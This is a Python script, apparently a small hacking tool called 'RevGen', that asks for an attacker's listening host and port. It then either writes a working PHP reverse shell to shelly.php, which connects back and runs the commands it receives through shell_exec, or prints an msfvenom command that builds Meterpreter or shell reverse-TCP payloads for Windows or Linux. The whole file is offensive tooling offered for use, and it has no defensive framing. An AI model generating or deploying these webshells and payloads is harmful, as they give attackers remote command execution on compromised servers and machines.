#!/usr/bin/env python3

def main():
    # ASCII Art Placeholder
    print("""

______           _____            
| ___ \         |  __ \           
| |_/ /_____   _| |  \/ ___ _ __  
|    // _ \ \ / / | __ / _ \ '_ \ 
| |\ \  __/\ V /| |_\ \  __/ | | |
\_| \_\___| \_/  \____/\___|_| |_| 
                                  v1.0
--------------------------------------
reverse shell generator by syphonfltr                                  

    """)

    # Collect user inputs
    lhost = input("Enter your LHOST: ")
    lport = input("Enter your LPORT: ")

    # Choose between webshell or malware
    print("1. Webshell\n2. Malware")
    choice = input("Choose an option (1 or 2): ")

    if choice == '1':
        create_php_webshell(lhost, lport)
    elif choice == '2':
        create_malware(lhost, lport)
    else:
        print("Invalid choice. Exiting.")

def create_php_webshell(lhost, lport):
    php_shell = f"""<?php
$ip = '{lhost}';
$port = {lport};

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    echo "Error: $errstr ($errno)\\n";
    exit(1);
}}

while (!feof($sock)) {{
    if (fgets($sock, 2) === false) {{
        break;
    }}
    $cmd = shell_exec(fgets($sock));
    fwrite($sock, $cmd);
}}

fclose($sock);
?>
    """
    with open("shelly.php", "w") as file:
        file.write(php_shell)
    print("PHP webshell created as shelly.php")

def create_malware(lhost, lport):
    print("1. Windows\n2. Linux")
    os_choice = input("Choose the target OS (1 or 2): ")

    print("1. Meterpreter\n2. Shell")
    payload_type = input("Choose the payload type (1 or 2): ")

    if os_choice == "1":
        payload_os = "windows"
    elif os_choice == "2":
        payload_os = "linux/x86"
    else:
        print("Invalid OS choice. Exiting.")
        return

    if payload_type == "1":
        payload_type = "meterpreter"
    elif payload_type == "2":
        payload_type = "shell"
    else:
        print("Invalid payload type. Exiting.")
        return

    file_type = "exe" if payload_os == "windows" else "elf"
    file_name = "payload.exe" if payload_os == "windows" else "payload.elf"

    msfvenom_command = f"msfvenom -p {payload_os}/{payload_type}_reverse_tcp LHOST={lhost} LPORT={lport} -f {file_type} -o {file_name}"
    print("Run the following msfvenom command to generate your payload:")
    print(msfvenom_command)

if __name__ == "__main__":
    main()
